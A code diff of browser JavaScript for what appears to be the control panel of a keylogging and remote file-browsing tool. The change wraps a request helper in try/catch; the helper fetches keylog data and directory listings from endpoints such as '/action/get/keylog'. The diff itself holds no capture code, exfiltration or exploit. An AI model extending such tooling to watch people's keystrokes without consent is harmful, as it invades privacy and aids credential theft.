@@ -32,42 +32,47 @@ window.addEventListener('load', function () {
 })
 
 async function request(what) {//make a request to server
-    var xhttp = new XMLHttpRequest();
 
-    xhttp.onreadystatechange = function () {
-        if (this.readyState == 4 && this.status == 200) {
+    try {
+        var xhttp = new XMLHttpRequest();
 
-            var resput = JSON.parse(this.responseText)//Resplnce is an object form the server
+        xhttp.onreadystatechange = function () {
+            if (this.readyState == 4 && this.status == 200) {
 
-            //console.log('Sever responed with: ', resput)
-            switch (what) {
-                case '/action/get/keylog'://keylog
-                    writeoutkeylog(resput)
-                    break;
-                case '/action/get/folders'://files and current dir
-                    directoryman.files = resput.files;
-                    directoryman.current_dir = resput.current_dir;
-                    dirbox.innerHTML = ""
-                    if (directoryman.current_dir[directoryman.current_dir.length - 1] == undefined) {
-                        document.getElementById('full_path').innerText = 'root';
-                    } else {
-                        document.getElementById('full_path').innerText = directoryman.current_dir[directoryman.current_dir.length - 1];
-                    }
+                var resput = JSON.parse(this.responseText)//Resplnce is an object form the server
 
-                    for (let i in resput.files) {
-                        directoryman.build_dir(resput.files[i].path, resput.files[i].name, resput.files[i].type)
-                    }
-                    //resput.files.forEach(filee => { directoryman.build_dir(resput.path, resput.name, resput.type) })
-                    break;
+                //console.log('Sever responed with: ', resput)
+                switch (what) {
+                    case '/action/get/keylog'://keylog
+                        writeoutkeylog(resput)
+                        break;
+                    case '/action/get/folders'://files and current dir
+                        directoryman.files = resput.files;
+                        directoryman.current_dir = resput.current_dir;
+                        dirbox.innerHTML = ""
+                        if (directoryman.current_dir[directoryman.current_dir.length - 1] == undefined) {
+                            document.getElementById('full_path').innerText = 'root';
+                        } else {
+                            document.getElementById('full_path').innerText = directoryman.current_dir[directoryman.current_dir.length - 1];
+                        }
+
+                        for (let i in resput.files) {
+                            directoryman.build_dir(resput.files[i].path, resput.files[i].name, resput.files[i].type)
+                        }
+                        //resput.files.forEach(filee => { directoryman.build_dir(resput.path, resput.name, resput.type) })
+                        break;
+                }
+                //return this.responseText;
+
             }
-            //return this.responseText;
+        };
+        //what must be a path
+        xhttp.open("GET", what, true);
+        xhttp.send();
+    } catch {
+        console.warn('xhttp request failed');
+    }
 
-        }
-    };
-
-    //what must be a path
-    xhttp.open("GET", what, true);
-    xhttp.send();
 }
 
 async function post(what, where) {//post data to server
@@ -87,6 +92,10 @@ async function post(what, where) {//post data to server
 
     xhttp.open("POST", where, true);
     xhttp.send(JSON.stringify(what));
+}
+
+async function submitform(){
+    
 }
 
 function writeoutkeylog(keys) {//write keylog data to page
